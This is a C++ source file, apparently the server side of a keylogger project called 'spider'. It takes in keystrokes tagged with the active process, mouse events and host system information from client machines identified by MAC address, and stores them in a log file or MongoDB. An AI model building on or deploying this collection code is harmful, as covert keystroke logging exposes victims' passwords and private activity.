#include "EventStorage.h"
#include "Logger.hpp"
#include "Keys.h"
#include "SystemInfo.h"
#include <cstring>
#include <map>
#include <chrono>

namespace spider
{
  namespace server
  {
    EventStorage::EventStorage() : header(), ev()
    {
    }

    EventStorage::~EventStorage()
    {
    }

    EventStorage::EventStorage(EventStorage const &other) noexcept
        : header(other.header), ev(other.ev)
    {
    }

    EventStorage &EventStorage::operator=(EventStorage const &other) noexcept
    {
      if (this != &other)
	{
	  header = other.header;
	  ev = other.ev;
	}
      return (*this);
    }
#if defined MONGOCXX
    Storage::Storage() : m_storage{}, m_logFile(), m_mongoInstance{}, m_mongoClient{mongocxx::uri{}}, m_mongoDb(m_mongoClient["spider"])
#else
    Storage::Storage() : m_storage{}, m_logFile()
#endif
    {
      m_logFile.open("event.log", std::ios_base::app);
      m_logFile << "===Logging started===\n";
    }

    Storage::~Storage()
    {
      m_logFile.close();
    }

    void Storage::push(EventStorage const &ev)
    {
      m_storage.push(ev);
    }

    void Storage::write()
    {
      static std::map<network::tcp::PacketEventState, std::string> const
          stateMap = {{network::tcp::PacketEventState::Down, "Down"},
                      {network::tcp::PacketEventState::Up, "Up"}};
      static std::map<network::tcp::PacketType, std::string> const typeMap = {
          {network::tcp::PacketType::KeyboardEvent, "Keyboard"},
          {network::tcp::PacketType::MouseButton, "MouseClick"},
          {network::tcp::PacketType::MousePosition, "MousePosition"},
          {network::tcp::PacketType::Screenshot, "Screenshot"},
          {network::tcp::PacketType::Infos, "Infos"}};
      static std::map<client::library::MouseButton, std::string> const
          mouseButtonMap = {
              {client::library::MouseButton::None, "None"},
              {client::library::MouseButton::ButtonLeft, "ButtonLeft"},
              {client::library::MouseButton::ButtonRight, "ButtonRight"}};
      static std::map<client::library::KeyboardKey, std::string> const keyMap =
          {{client::library::KeyboardKey::KB_A, "A"},
           {client::library::KeyboardKey::KB_B, "B"},
           {client::library::KeyboardKey::KB_C, "C"},
           {client::library::KeyboardKey::KB_D, "D"},
           {client::library::KeyboardKey::KB_E, "E"},
           {client::library::KeyboardKey::KB_F, "F"},
           {client::library::KeyboardKey::KB_G, "G"},
           {client::library::KeyboardKey::KB_H, "H"},
           {client::library::KeyboardKey::KB_I, "I"},
           {client::library::KeyboardKey::KB_J, "J"},
           {client::library::KeyboardKey::KB_K, "K"},
           {client::library::KeyboardKey::KB_L, "L"},
           {client::library::KeyboardKey::KB_M, "M"},
           {client::library::KeyboardKey::KB_N, "N"},
           {client::library::KeyboardKey::KB_O, "O"},
           {client::library::KeyboardKey::KB_P, "P"},
           {client::library::KeyboardKey::KB_Q, "Q"},
           {client::library::KeyboardKey::KB_R, "R"},
           {client::library::KeyboardKey::KB_S, "S"},
           {client::library::KeyboardKey::KB_T, "T"},
           {client::library::KeyboardKey::KB_U, "U"},
           {client::library::KeyboardKey::KB_V, "V"},
           {client::library::KeyboardKey::KB_W, "W"},
           {client::library::KeyboardKey::KB_X, "X"},
           {client::library::KeyboardKey::KB_Y, "Y"},
           {client::library::KeyboardKey::KB_Z, "Z"},
           {client::library::KeyboardKey::KB_0, "0"},
           {client::library::KeyboardKey::KB_1, "1"},
           {client::library::KeyboardKey::KB_2, "2"},
           {client::library::KeyboardKey::KB_3, "3"},
           {client::library::KeyboardKey::KB_4, "4"},
           {client::library::KeyboardKey::KB_5, "5"},
           {client::library::KeyboardKey::KB_6, "6"},
           {client::library::KeyboardKey::KB_7, "7"},
           {client::library::KeyboardKey::KB_8, "8"},
           {client::library::KeyboardKey::KB_9, "9"},
           {client::library::KeyboardKey::KB_ARROW_LEFT, "<left arrow>"},
           {client::library::KeyboardKey::KB_ARROW_RIGHT, "<right arrow>"},
           {client::library::KeyboardKey::KB_ARROW_UP, "<up arrow>"},
           {client::library::KeyboardKey::KB_ARROW_DOWN, "<down arrow>"},
           {client::library::KeyboardKey::KB_SPACE, "<space>"},
           {client::library::KeyboardKey::KB_ENTER, "<enter>"},
           {client::library::KeyboardKey::KB_SPACE, "<space>"},
           {client::library::KeyboardKey::KB_BACKSPACE, "<backspace>"},
           {client::library::KeyboardKey::KB_LCTRL, "<left ctrl>"},
           {client::library::KeyboardKey::KB_RCTRL, "<right ctrl>"},
           {client::library::KeyboardKey::KB_LALT, "<left alt>"},
           {client::library::KeyboardKey::KB_RALT, "<right alt>"},
           {client::library::KeyboardKey::KB_LSHIFT, "<left shift>"},
           {client::library::KeyboardKey::KB_RSHIFT, "<right shift>"},
           {client::library::KeyboardKey::KB_CAPSLOCK, "<capslock>"},
           {client::library::KeyboardKey::KB_TAB, "<tab>"},
           {client::library::KeyboardKey::KB_ESCAPE, "<escape>"},
           {client::library::KeyboardKey::KB_PAGEUP, "<page up>"},
           {client::library::KeyboardKey::KB_PAGEDOWN, "<page down>"},
           {client::library::KeyboardKey::KB_HOME, "<home>"},
           {client::library::KeyboardKey::KB_END, "<end>"},
           {client::library::KeyboardKey::KB_FN1, "<function key 1>"},
           {client::library::KeyboardKey::KB_FN2, "<function key 2>"},
           {client::library::KeyboardKey::KB_FN3, "<function key 3>"},
           {client::library::KeyboardKey::KB_FN4, "<function key 4>"},
           {client::library::KeyboardKey::KB_FN5, "<function key 5>"},
           {client::library::KeyboardKey::KB_FN6, "<function key 6>"},
           {client::library::KeyboardKey::KB_FN7, "<function key 7>"},
           {client::library::KeyboardKey::KB_FN8, "<function key 8>"},
           {client::library::KeyboardKey::KB_FN9, "<function key 9>"},
           {client::library::KeyboardKey::KB_FN10, "<function key 10>"},
           {client::library::KeyboardKey::KB_FN11, "<function key 11>"},
           {client::library::KeyboardKey::KB_FN12, "<function key 12>"},
           {client::library::KeyboardKey::KB_FN13, "<function key 13>"},
           {client::library::KeyboardKey::KB_FN14, "<function key 14>"},
           {client::library::KeyboardKey::KB_FN15, "<function key 15>"},
           {client::library::KeyboardKey::KB_FN16, "<function key 16>"},
           {client::library::KeyboardKey::KB_FN17, "<function key 17>"},
           {client::library::KeyboardKey::KB_FN18, "<function key 18>"},
           {client::library::KeyboardKey::KB_FN19, "<function key 19>"},
           {client::library::KeyboardKey::KB_FN20, "<function key 20>"},
           {client::library::KeyboardKey::KB_FN21, "<function key 21>"},
           {client::library::KeyboardKey::KB_FN22, "<function key 22>"},
           {client::library::KeyboardKey::KB_FN23, "<function key 23>"},
           {client::library::KeyboardKey::KB_FN24, "<function key 24>"},
           {client::library::KeyboardKey::KB_COMMA, ","},
           {client::library::KeyboardKey::KB_DOT, "."},
           {client::library::KeyboardKey::KB_SLASH, "/"},
           {client::library::KeyboardKey::KB_INFERIOR, "<"},
           {client::library::KeyboardKey::KB_SUPERIOR, ">"},
           {client::library::KeyboardKey::KB_QUESTION, "?"},
           {client::library::KeyboardKey::KB_SEMICOLON, ";"},
           {client::library::KeyboardKey::KB_COLON, ":"},
           {client::library::KeyboardKey::KB_BACKQUOTE, "`"},
           {client::library::KeyboardKey::KB_SIMPLEQUOTE, "'"},
           {client::library::KeyboardKey::KB_DOUBLEQUOTE, "\""},
           {client::library::KeyboardKey::KB_LEFTBRACE, "{"},
           {client::library::KeyboardKey::KB_RIGHTBRACE, "}"},
           {client::library::KeyboardKey::KB_LEFTBRACKET, "["},
           {client::library::KeyboardKey::KB_RIGHTBRACKET, "]"},
           {client::library::KeyboardKey::KB_LEFTPAREN, "("},
           {client::library::KeyboardKey::KB_RIGHTPAREN, ")"},
           {client::library::KeyboardKey::KB_BACKSLASH, "\\"},
           {client::library::KeyboardKey::KB_VERTICALBAR, "|"},
           {client::library::KeyboardKey::KB_EXCLAMATION, "!"},
           {client::library::KeyboardKey::KB_ATSYMBOL, "@"},
           {client::library::KeyboardKey::KB_HASHTAG, "#"},
           {client::library::KeyboardKey::KB_DOLLAR, "$"},
           {client::library::KeyboardKey::KB_PERCENT, "%"},
           {client::library::KeyboardKey::KB_CIRCUMFLEX, "^"},
           {client::library::KeyboardKey::KB_AMPERSAND, "&"},
           {client::library::KeyboardKey::KB_ASTERISK, "*"},
           {client::library::KeyboardKey::KB_TILDE, "~"},
           {client::library::KeyboardKey::KB_UNDERSCORE, "_"},
           {client::library::KeyboardKey::KB_MINUS, "-"},
           {client::library::KeyboardKey::KB_PLUS, "+"},
           {client::library::KeyboardKey::KB_EQUALS, "="},
           {client::library::KeyboardKey::KB_DELETE, "<delete>"},
           {client::library::KeyboardKey::KB_NUMLOCK, "<numlock>"},
           {client::library::KeyboardKey::KB_SCROLL, "<scroll lock>"},
           {client::library::KeyboardKey::KB_LCMD, "<left command>"},
           {client::library::KeyboardKey::KB_RCMD, "<right command>"},
           {client::library::KeyboardKey::KB_A_MINUS, "a"},
           {client::library::KeyboardKey::KB_B_MINUS, "b"},
           {client::library::KeyboardKey::KB_C_MINUS, "c"},
           {client::library::KeyboardKey::KB_D_MINUS, "d"},
           {client::library::KeyboardKey::KB_E_MINUS, "e"},
           {client::library::KeyboardKey::KB_F_MINUS, "f"},
           {client::library::KeyboardKey::KB_G_MINUS, "g"},
           {client::library::KeyboardKey::KB_H_MINUS, "h"},
           {client::library::KeyboardKey::KB_I_MINUS, "i"},
           {client::library::KeyboardKey::KB_J_MINUS, "j"},
           {client::library::KeyboardKey::KB_K_MINUS, "k"},
           {client::library::KeyboardKey::KB_L_MINUS, "l"},
           {client::library::KeyboardKey::KB_M_MINUS, "m"},
           {client::library::KeyboardKey::KB_N_MINUS, "n"},
           {client::library::KeyboardKey::KB_O_MINUS, "o"},
           {client::library::KeyboardKey::KB_P_MINUS, "p"},
           {client::library::KeyboardKey::KB_Q_MINUS, "q"},
           {client::library::KeyboardKey::KB_R_MINUS, "r"},
           {client::library::KeyboardKey::KB_S_MINUS, "s"},
           {client::library::KeyboardKey::KB_T_MINUS, "t"},
           {client::library::KeyboardKey::KB_U_MINUS, "u"},
           {client::library::KeyboardKey::KB_V_MINUS, "v"},
           {client::library::KeyboardKey::KB_W_MINUS, "w"},
           {client::library::KeyboardKey::KB_X_MINUS, "x"},
           {client::library::KeyboardKey::KB_Y_MINUS, "y"},
           {client::library::KeyboardKey::KB_Z_MINUS, "z"},
           {client::library::KeyboardKey::KB_DEGREE, "°"},
           {client::library::KeyboardKey::KB_DIAERESIS, "¨"},
           {client::library::KeyboardKey::KB_POUND, "£"},
           {client::library::KeyboardKey::KB_SECTION, "§"},
           {client::library::KeyboardKey::KB_AGRAVE, "à"},
           {client::library::KeyboardKey::KB_EACUTE, "é"},
           {client::library::KeyboardKey::KB_EGRAVE, "è"},
           {client::library::KeyboardKey::KB_CCEDIL, "ç"},
           {client::library::KeyboardKey::KB_UGRAVE, "ù"},
           {client::library::KeyboardKey::KB_NONE, "<unknown>"}};
      static std::map<client::library::OperatingSystem, std::string> const
          osMap = {
              {spider::client::library::OperatingSystem::Windows, "Windows"},
              {spider::client::library::OperatingSystem::MacOS, "MacOS"},
              {spider::client::library::OperatingSystem::Linux, "Linux"},
              {spider::client::library::OperatingSystem::Other, "Other"}};
      static std::map<client::library::Architecture, std::string> const
          architectureMap = {
              {client::library::Architecture::BITS_64, "64 bits"},
              {client::library::Architecture::BITS_32, "32 bits"},
              {client::library::Architecture::BITS_UNKNOWN, "Unknown bits"}};
      static std::map<client::library::ProcArchitecture,
                      std::string> const procArchitectureMap = {
          {client::library::ProcArchitecture::AMD64, "AMD64"},
          {client::library::ProcArchitecture::ARM, "ARM"},
          {client::library::ProcArchitecture::IntelItanium, "Intel Itanium"},
          {client::library::ProcArchitecture::x86, "x86"},
          {client::library::ProcArchitecture::Unknown, "Unknown"}};

      while (!m_storage.empty())
	{
	  EventStorage const &store = m_storage.front();

          // creating document for DB
#if defined MONGOCXX
          auto builder = bsoncxx::builder::stream::document{};
          //mongocxx::collection coll = db["getinfo"];
          mongocxx::collection coll;
#endif
	  std::string msg;
	  {
	    std::array<char, 64 * 8> tmp;
	    std::snprintf(
	        tmp.data(), sizeof(tmp), "%02X:%02X:%02X:%02X:%02X:%02X",
	        store.header.macAddress[0], store.header.macAddress[1],
	        store.header.macAddress[2], store.header.macAddress[3],
	        store.header.macAddress[4], store.header.macAddress[5]);
	    msg = tmp.data();
	  }
#if defined MONGOCXX
          bsoncxx::document::value doc_value = builder
            << "macaddr" << msg << bsoncxx::builder::stream::finalize;
#endif

	  {

	    std::string type;
	    if (typeMap.find(store.header.type) == typeMap.end())
	      {
		type = "Unknown";
		nope::log::Log(Info) << "Unknown type event";
	      }
	    else
	      {
		type = typeMap.at(store.header.type);
	      }

	    msg += " - " +
	           timeToString(static_cast<std::time_t>(store.header.time)) +
	           " - " + type + " - ";
#if defined MONGOCXX
            doc_value = builder << bsoncxx::builder::stream::concatenate(doc_value.view())
              << "date" << timeToString(static_cast<std::time_t>(store.header.time))
              << "command" << type << bsoncxx::builder::stream::finalize;
            coll = m_mongoDb[type];
#endif

	  }

	  switch (store.header.type)
	    {
	    case network::tcp::PacketType::KeyboardEvent:
	      {
		std::string key;
		if (keyMap.find(static_cast<client::library::KeyboardKey>(
		        store.ev.key)) == keyMap.end())
		  {
		    key = "<unknown>";
		  }
		else
		  {
		    key = keyMap.at(static_cast<client::library::KeyboardKey>(
		        store.ev.key));
		  }

		msg += key + " - " + stateMap.at(store.ev.state) + " [" +
		       reinterpret_cast<char const *>(
		           store.ev.processName.data()) +
		       "]";
#if defined MONGOCXX
            doc_value = builder << bsoncxx::builder::stream::concatenate(doc_value.view())
                  << "key" <<  key
                  << "state" << stateMap.at(store.ev.state)
                  << "processName" << reinterpret_cast<char const *>(store.ev.processName.data())
                  << bsoncxx::builder::stream::finalize;
#endif
	      }
	      break;
	    case network::tcp::PacketType::MouseButton:
	      {
		std::string mouseKey;
		if (mouseButtonMap.find(
		        static_cast<client::library::MouseButton>(
		            store.ev.key)) == mouseButtonMap.end())
		  {
		    mouseKey = "<unknown>";
		  }
		else
		  {
		    mouseKey = mouseButtonMap.at(
		        static_cast<client::library::MouseButton>(
		            store.ev.key));
		  }
		msg += mouseKey + " - " + stateMap.at(store.ev.state) + " [" +
		       reinterpret_cast<char const *>(
		           store.ev.processName.data()) +
		       "]";
#if defined MONGOCXX
            doc_value = builder << bsoncxx::builder::stream::concatenate(doc_value.view())
                  << "mouseKey" << mouseKey
                  << "state" << stateMap.at(store.ev.state)
                  << "processName" << reinterpret_cast<char const *>(store.ev.processName.data())
                  << bsoncxx::builder::stream::finalize;
#endif
	      }
	      break;
	    case network::tcp::PacketType::MousePosition:
	      msg += std::to_string(store.mov.posX) + " - " +
	             std::to_string(store.mov.posY) + " [" +
	             reinterpret_cast<char const *>(
	                 store.mov.processName.data()) +
	             "]";
#if defined MONGOCXX
            doc_value = builder << bsoncxx::builder::stream::concatenate(doc_value.view())
                << "posX" << std::to_string(store.mov.posX)
                << "posY" << std::to_string(store.mov.posY)
                << "processName" << reinterpret_cast<char const *>(store.mov.processName.data())
                << bsoncxx::builder::stream::finalize;
#endif
	      break;
	    case network::tcp::PacketType::Screenshot:
	      break;
	    case network::tcp::PacketType::Infos:
	      {
		msg +=
		    procArchitectureMap.at(
		        static_cast<spider::client::library::ProcArchitecture>(
		            store.infos.procArch)) +
		    " - " +
		    architectureMap.at(
		        static_cast<spider::client::library::Architecture>(
		            store.infos.arch)) +
		    " - " +
		    osMap.at(
		        static_cast<spider::client::library::OperatingSystem>(
		            store.infos.os)) +
		    " - " + std::to_string(store.infos.pageSize) + " Kb - " +
		    std::to_string(store.infos.nbProc) + " CPUs - " +
		    std::to_string(store.infos.ram) + " Mb";
#if defined MONGOCXX
            doc_value = builder << bsoncxx::builder::stream::concatenate(doc_value.view())
                  << "archi_proc" << procArchitectureMap.at(
		        static_cast<spider::client::library::ProcArchitecture>
                        (store.infos.procArch))
                  << "archi_os" << architectureMap.at(
		        static_cast<spider::client::library::Architecture>(
		            store.infos.arch))
                  << "os" << osMap.at(
		        static_cast<spider::client::library::OperatingSystem>(
		            store.infos.os))
                  << "cahe_size" << std::to_string(store.infos.pageSize) + " Kb"
                  << "cpu" << std::to_string(store.infos.nbProc) + " CPUs"
                  << "ram" << std::to_string(store.infos.ram) + " Mb"
                  << bsoncxx::builder::stream::finalize;
#endif
	      }
	      break;
	    }

#if defined MONGOCXX
          bsoncxx::document::view view = doc_value.view();
          try
          {
            bsoncxx::stdx::optional<mongocxx::result::insert_one> result =
              coll.insert_one(view);
          } catch (...)
          {
            nope::log::Log(Info) << "Cannot connect to mongoDB.";
          }
#else
          m_logFile << msg << '\n';
#endif
          nope::log::Log(Info) << msg;
          m_storage.pop();
        }
    }

    std::string Storage::timeToString(std::time_t const rawtime) const
    {
      struct tm *dt;
      std::array<char, 64> buffer{};

      dt = std::localtime(&rawtime);
      if (dt)
      {
        std::strftime(buffer.data(), sizeof(buffer), "%c", dt);
      }
      return std::string(buffer.data());
    }
  }
}
